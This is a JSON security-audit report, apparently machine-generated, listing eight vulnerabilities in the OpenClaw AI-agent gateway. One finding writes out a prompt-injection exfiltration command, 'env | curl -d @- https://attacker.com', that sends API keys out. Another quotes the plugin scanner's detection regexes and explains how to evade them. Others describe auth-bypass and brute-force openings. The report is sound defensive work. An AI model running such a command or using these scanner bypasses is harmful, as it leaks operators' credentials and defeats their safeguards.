@@ -1,0 +1,111 @@
+{
+  "repository_path": "/private/var/folders/gw/14xtk_2n21q2jfw80ymcy4_r0000gn/T/securevibes-GHSA-3c6h-g97w-fg78-stoa0v47/openclaw",
+  "issues": [
+    {
+      "id": "THREAT-003",
+      "severity": "high",
+      "title": "Rate Limiter Disabled by Default \u2014 Brute Force Unprotected",
+      "description": "The gateway authentication rate limiter is only created when `gateway.auth.rateLimit` is explicitly configured (line 314-317 of server.impl.ts). Without this config key, `authRateLimiter` is `undefined` and is never created. All calls to `limiter?.recordFailure()`, `limiter?.check()` etc. are no-ops. An attacker can make unlimited token/password guesses without any lockout. Even when the limiter IS configured, it is purely in-memory with no persistence, so any process restart (triggered remotely via the authenticated `restart` gateway command, or by a crash) resets all lockout counters to zero.",
+      "file_path": "src/gateway/server.impl.ts",
+      "line_number": 314,
+      "code_snippet": "const rateLimitConfig = cfgAtStart.gateway?.auth?.rateLimit;\nconst authRateLimiter: AuthRateLimiter | undefined = rateLimitConfig\n  ? createAuthRateLimiter(rateLimitConfig)\n  : undefined;",
+      "recommendation": "Create the rate limiter by default (remove the opt-in guard) rather than requiring operators to explicitly configure it. Persist rate-limit state to disk so lockouts survive restarts. Enforce a minimum token entropy requirement.",
+      "cwe_id": "CWE-307",
+      "evidence": "server.impl.ts line 314-317: `const authRateLimiter: AuthRateLimiter | undefined = rateLimitConfig ? createAuthRateLimiter(rateLimitConfig) : undefined;` \u2014 without `gateway.auth.rateLimit` in config the limiter is undefined. In auth.ts the limiter is only used when non-null: `if (limiter) { const rlCheck = limiter.check(...) }` (line 367-377). Default gateway deployments therefore have zero brute-force protection. Auth-rate-limit.ts confirms the limiter is purely in-memory (Map on line 90) with no disk persistence."
+    },
+    {
+      "id": "THREAT-002",
+      "severity": "high",
+      "title": "Trusted-Proxy Mode Header Injection Without Firewall Allows Full Auth Bypass",
+      "description": "In `trusted-proxy` auth mode the gateway reads user identity exclusively from the HTTP header named in `trustedProxy.userHeader`. The code checks that the TCP connection's `remoteAddress` is in the `trustedProxies` IP allowlist (authorizeTrustedProxy lines 294-297). However, if the gateway is network-accessible and the operator has not configured OS-level firewall rules restricting port 18789 to only the proxy IP, any network attacker can forge the user-identity header. The code enforces no additional credential check in this path \u2014 a valid IP in `trustedProxies` plus the correct header is all that is needed. The `allowUsers` list is optional and defaults to an empty array (meaning all users are permitted).",
+      "file_path": "src/gateway/auth.ts",
+      "line_number": 283,
+      "code_snippet": "function authorizeTrustedProxy(params: {\n  req?: IncomingMessage;\n  trustedProxies?: string[];\n  trustedProxyConfig: GatewayTrustedProxyConfig;\n}): { user: string } | { reason: string } {\n  ...\n  const remoteAddr = req.socket?.remoteAddress;\n  if (!remoteAddr || !isTrustedProxyAddress(remoteAddr, trustedProxies)) {\n    return { reason: 'trusted_proxy_untrusted_source' };\n  }\n  ...\n  const allowUsers = trustedProxyConfig.allowUsers ?? [];\n  if (allowUsers.length > 0 && !allowUsers.includes(user)) {\n    return { reason: 'trusted_proxy_user_not_allowed' };\n  }\n  return { user };\n}",
+      "recommendation": "Document prominently (and enforce at startup) that `trusted-proxy` mode requires OS-level firewall rules restricting port access to only the proxy IP. Additionally require a non-empty `allowUsers` list. Consider requiring `requiredHeaders` as a secondary check. Prefer `token` or `password` mode unless the proxy is genuinely the only network path.",
+      "cwe_id": "CWE-306",
+      "evidence": "auth.ts lines 283-319: The entire trusted-proxy auth path resolves to `{ user }` after just an IP address check against `trustedProxies` and an optional `allowUsers` check. No cryptographic credential is verified. server-runtime-config.ts lines 98-109 enforce that `trustedProxies.length > 0` but nothing blocks a CIDR-wide trusted range. The `allowUsers` array defaults to `[]` (line 314: `const allowUsers = trustedProxyConfig.allowUsers ?? []`), meaning any user identity header is accepted when the list is empty."
+    },
+    {
+      "id": "THREAT-004",
+      "severity": "high",
+      "title": "Exec-Approvals Allowlist Persistence Provides Persistent Unauthorized Shell Execution",
+      "description": "The `exec.approvals.set` gateway handler writes shell command approval patterns to `~/.openclaw/exec-approvals.json` on disk. Any authenticated gateway session (token or trusted-proxy) can call this handler. Once a broad pattern (e.g., a path wildcard) is written to disk it persists across gateway restarts, token rotations, and session resets. On subsequent agent runs the approved patterns authorize shell execution without any further user confirmation. The only race-condition guard is a `baseHash` check (requireApprovalsBaseHash), but this only prevents stale concurrent writes \u2014 it does not require elevated credentials or limit what patterns can be approved.",
+      "file_path": "src/gateway/server-methods/exec-approvals.ts",
+      "line_number": 107,
+      "code_snippet": "\"exec.approvals.set\": ({ params, respond }) => {\n  ...\n  ensureExecApprovals();\n  const snapshot = readExecApprovalsSnapshot();\n  if (!requireApprovalsBaseHash(params, snapshot, respond)) {\n    return;\n  }\n  ...\n  const normalized = normalizeExecApprovals(incoming as ExecApprovalsFile);\n  const next = mergeExecApprovalsSocketDefaults({ normalized, current: snapshot.file });\n  saveExecApprovals(next);\n  ...\n}",
+      "recommendation": "Require re-authentication or a separate elevated scope token for exec-approvals writes. Implement approval pattern expiry timestamps. Invalidate stored approvals when the gateway token changes. Restrict `exec.approvals.set` to connections with a privileged admin scope.",
+      "cwe_id": "CWE-285",
+      "evidence": "exec-approvals.ts (server-methods) lines 107-129: `exec.approvals.set` handler has no scope/privilege check beyond base gateway authentication. It calls `saveExecApprovals(next)` which persists the patterns to disk. The `requireApprovalsBaseHash` guard only checks for concurrent conflicting writes \u2014 not the sensitivity of the operation. Any valid gateway connection can call this endpoint. Token rotation does not invalidate existing approvals on disk (confirmed by infra/exec-approvals.ts where the file is read by path, with no binding to the active gateway token)."
+    },
+    {
+      "id": "THREAT-006",
+      "severity": "high",
+      "title": "Plugin Code Runs In-Process with Full Gateway Privileges \u2014 Skill Scanner is Bypassable",
+      "description": "Plugins loaded from `~/.openclaw/plugins/` are executed in the same Node.js process as the gateway (server.impl.ts line 271: `loadGatewayPlugins`). The skill scanner in skill-scanner.ts performs only surface-level regex pattern matching. Specifically: (1) the `dangerous-exec` rule only triggers when both the execution call AND the string `child_process` appear in the same source file \u2014 trivially bypassed by splitting the import and usage across files or using `require` with a string expression; (2) the `env-harvesting` rule requires both `process.env` and a network call pattern in the same file \u2014 bypassed by reading env in one module and passing the values to another; (3) the `obfuscated-code` rule only matches literal hex runs of 6+ characters, missing common obfuscation like `Buffer.from` with short chunks or string concatenation splits; (4) the scanner only covers 500 files by default and skips files over 1MB. A malicious plugin that passes these checks runs with full access to all gateway internals, config, and API keys.",
+      "file_path": "src/security/skill-scanner.ts",
+      "line_number": 80,
+      "code_snippet": "const LINE_RULES: LineRule[] = [\n  {\n    ruleId: \"dangerous-exec\",\n    severity: \"critical\",\n    message: \"Shell command execution detected (child_process)\",\n    pattern: /\\b(exec|execSync|spawn|spawnSync|execFile|execFileSync)\\s*\\(/,\n    requiresContext: /child_process/,\n  },\n  ...\n];\n\nconst SOURCE_RULES: SourceRule[] = [\n  {\n    ruleId: \"env-harvesting\",\n    severity: \"critical\",\n    message: \"Environment variable access combined with network send \u2014 possible credential harvesting\",\n    pattern: /process\\.env/,\n    requiresContext: /\\bfetch\\b|\\bpost\\b|http\\.request/i,\n  },\n];",
+      "recommendation": "Run plugins in a separate process with a restricted IPC interface rather than the same Node.js process. Implement cryptographic signature verification against a trusted registry. Use AST-based static analysis instead of regex. Implement a declarative capability model requiring plugins to declare required capabilities.",
+      "cwe_id": "CWE-829",
+      "evidence": "skill-scanner.ts lines 80-137: The `dangerous-exec` rule requires `child_process` as context on the same file (line 86: `requiresContext: /child_process/`). A plugin using `const cp = require('child' + '_process'); cp.exec('...')` would not match. The env-harvesting rule (lines 132-137) requires both patterns in one file, so splitting across modules defeats it. server.impl.ts lines 269-277 confirm plugins are loaded into the same process: `const { pluginRegistry, gatewayMethods: baseGatewayMethods } = loadGatewayPlugins({...})` and then passed directly to `attachGatewayWsHandlers`."
+    },
+    {
+      "id": "THREAT-010",
+      "severity": "high",
+      "title": "API Keys Accessible in Host Process Environment Enabling Exfiltration via Exec Tool",
+      "description": "LLM provider API keys (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc.) are loaded from `process.env` and remain accessible to the entire Node.js process throughout its lifetime. The `sanitizeEnvVars()` function only scrubs environment variables when constructing the environment for Docker sandbox containers \u2014 it does NOT scrub `process.env` in the host process. When the exec tool runs with `host=gateway` (the gateway host mode), it inherits the full unfiltered process environment (bash-tools.exec.ts line 319: `const baseEnv = coerceEnv(process.env)`). A prompt injection attack that causes the agent to run a command like `env | curl -d @- https://attacker.com` on the gateway host (if `security=full`) would exfiltrate all API keys. Even with `security=allowlist`, the allowlist entries that pre-approve a pattern could include such a command if an attacker has previously written to the approvals file.",
+      "file_path": "src/agents/bash-tools.exec.ts",
+      "line_number": 319,
+      "code_snippet": "const baseEnv = coerceEnv(process.env);\n\n// Logic: Sandbox gets raw env. Host (gateway/node) must pass validation.\n// We validate BEFORE merging to prevent any dangerous vars from entering the stream.\nif (host !== 'sandbox' && params.env) {\n  validateHostEnv(params.env);\n}\n\nconst mergedEnv = params.env ? { ...baseEnv, ...params.env } : baseEnv;",
+      "recommendation": "Delete known API key environment variables from `process.env` at startup before the agent runner initializes. Pass API keys only to specific HTTP client modules via closures rather than as process-level env vars. Extend the exec security allowlist to block commands that access or exfiltrate environment variables.",
+      "cwe_id": "CWE-526",
+      "evidence": "bash-tools.exec.ts line 319: `const baseEnv = coerceEnv(process.env)` \u2014 the full host process environment (including all API keys) is used as the base environment for gateway-host exec. sanitize-env-vars.ts lines 1-19 confirm that `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` etc. are in `BLOCKED_ENV_VAR_PATTERNS`, but this function is only called when building sandbox (Docker) container environments, not for gateway-host execution. Comment on line 322 explicitly says 'Sandbox gets raw env. Host (gateway/node) must pass validation' \u2014 the validation for host mode (validateHostEnv) only checks the REQUEST-supplied env vars (params.env), not the inherited base environment."
+    },
+    {
+      "id": "THREAT-012",
+      "severity": "high",
+      "title": "No Concurrent Session Cap Allows Resource Exhaustion via Open Channel",
+      "description": "The gateway has no programmatic limit on the number of concurrent agent sessions. Sessions are spawned for each unique sender to an open channel (e.g., `allowFrom: [\"*\"]` for Telegram). Each session spawns an LLM inference loop with associated memory allocation, bash process management, and network connections. There is no circuit breaker, per-sender rate limit on session creation, or global session count limit. The security audit warns about wildcard `allowFrom` but does not prevent session creation.",
+      "file_path": "src/gateway/server.impl.ts",
+      "line_number": 430,
+      "code_snippet": "const channelManager = createChannelManager({\n  loadConfig,\n  channelLogs,\n  channelRuntimeEnvs,\n});",
+      "recommendation": "Implement a global maximum concurrent sessions limit with a configurable cap (e.g., `gateway.maxConcurrentSessions`). Add per-sender rate limiting on session creation for channels with wildcard `allowFrom`. Implement a circuit breaker that rejects new sessions when memory pressure exceeds a threshold. Require explicit allowlists for channel senders in non-development deployments.",
+      "cwe_id": "CWE-770",
+      "evidence": "server.impl.ts shows no session count check or cap when `createChannelManager` is called. getActiveEmbeddedRunCount() from pi-embedded-runner/runs.ts is used only for restart deferral (line 262: `setPreRestartDeferralCheck(() => getTotalQueueSize() + getTotalPendingReplies() + getActiveEmbeddedRunCount())`), not as a guard on session creation. The THREAT_MODEL.json confirms: 'No programmatic concurrent session cap exists. Wildcard allowFrom deployments have no rate limiting on session creation.'"
+    },
+    {
+      "id": "THREAT-008",
+      "severity": "medium",
+      "title": "mDNS/Bonjour Advertises Gateway Port and TLS Fingerprint by Default on Local Network",
+      "description": "The gateway starts Bonjour/mDNS advertising by default unless `discovery.mdns.mode=off` or the `OPENCLAW_DISABLE_BONJOUR=1` environment variable is set. The default mode is `minimal` (line 23 of server-discovery-runtime.ts: `const mdnsMode = params.mdnsMode ?? 'minimal'`), which still advertises the gateway port and TLS fingerprint to all devices on the local network. An attacker on the same Wi-Fi network can trivially discover gateway endpoints. Combined with weak or absent auth (`mode=none`) or default-generated tokens, this creates a direct path to gateway access.",
+      "file_path": "src/gateway/server-discovery-runtime.ts",
+      "line_number": 23,
+      "code_snippet": "const mdnsMode = params.mdnsMode ?? 'minimal';\n// mDNS can be disabled via config (mdnsMode: off) or env var.\nconst bonjourEnabled =\n  mdnsMode !== 'off' &&\n  process.env.OPENCLAW_DISABLE_BONJOUR !== '1' &&\n  process.env.NODE_ENV !== 'test' &&\n  !process.env.VITEST;",
+      "recommendation": "Default to `mdnsMode: off` for non-loopback gateways. Do not include the TLS fingerprint in minimal-mode advertisements (it provides a free bypass of certificate trust warnings). Require explicit opt-in to enable Bonjour advertising and document the network exposure risk prominently.",
+      "cwe_id": "CWE-200",
+      "evidence": "server-discovery-runtime.ts lines 23-29: `mdnsMode` defaults to `'minimal'` when not explicitly configured, and `bonjourEnabled` is true by default in non-test environments. The Bonjour advertiser at lines 43-53 calls `startGatewayBonjourAdvertiser` with `gatewayTlsFingerprintSha256` included even in minimal mode (line 48: `gatewayTlsFingerprintSha256: params.gatewayTls?.fingerprintSha256`). This means gateway port AND TLS fingerprint are broadcast on the local network by default."
+    },
+    {
+      "id": "THREAT-005",
+      "severity": "medium",
+      "title": "Config Redaction Sentinel Can Persist to Disk on Concurrent Write or Missing Key",
+      "description": "The `restoreRedactedValues` function is called before writing config to disk to restore original secret values that were replaced with `__OPENCLAW_REDACTED__` in UI responses. When `restoreOriginalValueOrThrow` cannot find the original key in the in-memory config (because the key was added in a concurrent write or due to config desynchronization), it logs a warning and throws a `RedactionError` (line 383-385 of redact-snapshot.ts). The outer `restoreRedactedValues` function catches this error and returns `{ ok: false, humanReadableMessage: ... }`. However, if the write handler does not correctly handle this failure by aborting the write, the sentinel value `__OPENCLAW_REDACTED__` could be written to disk as the actual credential value, effectively blanking the token/password. Additionally, if a new sensitive key is added that is not yet in the `isSensitiveConfigPath` heuristic, it will not be redacted and will be sent to the browser in plaintext, then round-tripped back without restoration issues \u2014 but the plaintext leak is a separate concern.",
+      "file_path": "src/config/redact-snapshot.ts",
+      "line_number": 375,
+      "code_snippet": "function restoreOriginalValueOrThrow(params: {\n  key: string;\n  path: string;\n  original: Record<string, unknown>;\n}): unknown {\n  if (params.key in params.original) {\n    return params.original[params.key];\n  }\n  log.warn(`Cannot un-redact config key ${params.path} as it doesn't have any value`);\n  throw new RedactionError(params.path);\n}",
+      "recommendation": "Implement optimistic-locking or ETag-style versioning on config writes (similar to the base-hash mechanism used for exec-approvals). Validate before writing to disk that no sentinel values remain in the outgoing config. Emit a startup warning if the gateway token resolves to the sentinel string.",
+      "cwe_id": "CWE-362",
+      "evidence": "redact-snapshot.ts lines 375-385: when a key is not found in the original config during restore, a `RedactionError` is thrown. This is caught in `restoreRedactedValues` (lines 353-362) and returned as `{ ok: false }`. The config write handler in server-methods/config.ts must check this return value and abort; if it does not, the sentinel persists to disk. The concurrent-write risk is real: config.ts uses a base-hash check (requireConfigBaseHash) to detect concurrent changes, but this check only compares hashes of the file at the time of the last `config.get` \u2014 it does not prevent a race between `config.get` returning a redacted snapshot and an in-flight `config.set` writing using a stale snapshot whose original values no longer match the current on-disk config."
+    }
+  ],
+  "files_scanned": 4738,
+  "scan_time_seconds": 1135.18,
+  "total_cost_usd": 6.782300500000003,
+  "summary": {
+    "total": 8,
+    "critical": 0,
+    "high": 6,
+    "medium": 2,
+    "low": 0
+  }
+}
